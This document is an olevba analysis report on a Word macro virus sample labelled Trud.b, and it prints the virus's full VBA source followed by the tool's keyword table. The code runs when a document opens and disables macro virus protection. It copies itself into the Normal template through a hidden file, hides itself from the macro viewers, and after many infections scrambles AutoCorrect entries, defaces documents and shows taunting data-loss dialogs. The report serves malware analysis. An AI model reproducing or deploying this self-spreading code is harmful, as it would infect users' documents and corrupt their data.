olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Trud.b-f205319d5a8fda183d617e66ee1d7dd2e4356fd4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Trud.b-f205319d5a8fda183d617e66ee1d7dd2e4356fd4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error GoTo hometime
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
hohoho = 0
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
If nt > 0 And ad > 0 Then GoTo hometime
If Dir("c:\winini.log", vbSystem) = "" And nt = 0 Then
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\winini.log"
    SetAttr "c:\winini.log", vbSystem
    host.codemodule.AddFromFile ("c:\winini.log")
    host.codemodule.replaceline 5, "Private Sub Document_Close()"
    host.codemodule.replaceline 75, "Sub ViewVBCode()"
    host.codemodule.replaceline 78, "Sub ToolsMacro()"
Else
    plop = ActiveDocument.Saved
    plop2 = True
    Set host = ActiveDocument.VBProject.VBComponents.Item(1)
    host.codemodule.AddFromFile ("c:\winini.log")
End If
For x = 1 To 4
    host.codemodule.deletelines 1
Next x
hohoho = hohoho + 1
NormalTemplate.VBProject.VBComponents.Item(1).codemodule.replaceline 6, "hohoho = " & hohoho
If hohoho = 69 Then
    AutoCorrect.ReplaceText = True
    For z = 1 To AutoCorrect.Entries.Count
        txt1 = AutoCorrect.Entries.Item(z).Name
        txt2 = AutoCorrect.Entries.Item(z).Value
        AutoCorrect.Entries.Item(z).Value = "xyz"
        AutoCorrect.Entries.Item(z).Name = txt2
        AutoCorrect.Entries.Item(z).Value = txt1
    Next z
End If
If hohoho >= 69 Then
    Application.Caption = "Microsoft Turd"
    For x = 0 To 250 Step 50
    For y = 0 To 250 Step 50
        ActiveDocument.Shapes.AddShape(msoShapeSmileyFace, x, y, 50, 50).Fill.ForeColor.RGB = RGB(x, y, 250 - x)
    Next y
    Next x
    Set bln = Assistant.NewBalloon
    With bln
        .Heading = "Isn't life just a bitch"
        .Text = "Choose an option."
        .Labels(1).Text = "Loose all your data."
        .Labels(2).Text = "Loose most of your data."
        .Labels(3).Text = "Loose just enough data to really fuck you off"
        .BalloonType = msoBalloonTypeButtons
        .Mode = msoModeModal
        .Show
    End With
    With ActiveDocument.Content
        .InsertParagraphBefore
        .InsertBefore "Don't Worry About a Thing !!!    I wouldn't fuck up your data !!!"
    End With
    With ActiveDocument.Paragraphs(1).Range.Font
        .ColorIndex = wdGreen
        .Size = 24
    End With
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If plop2 Then ActiveDocument.Saved = plop
hometime:
End Sub
Private Sub Junk1()
    MsgBox ("Essential DLL missing.  Please reinstall Microsoft Office.")
End Sub
Private Sub junk2()
    MsgBox ("Essential DLL missing.  Please reinstall Microsoft Office.")
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

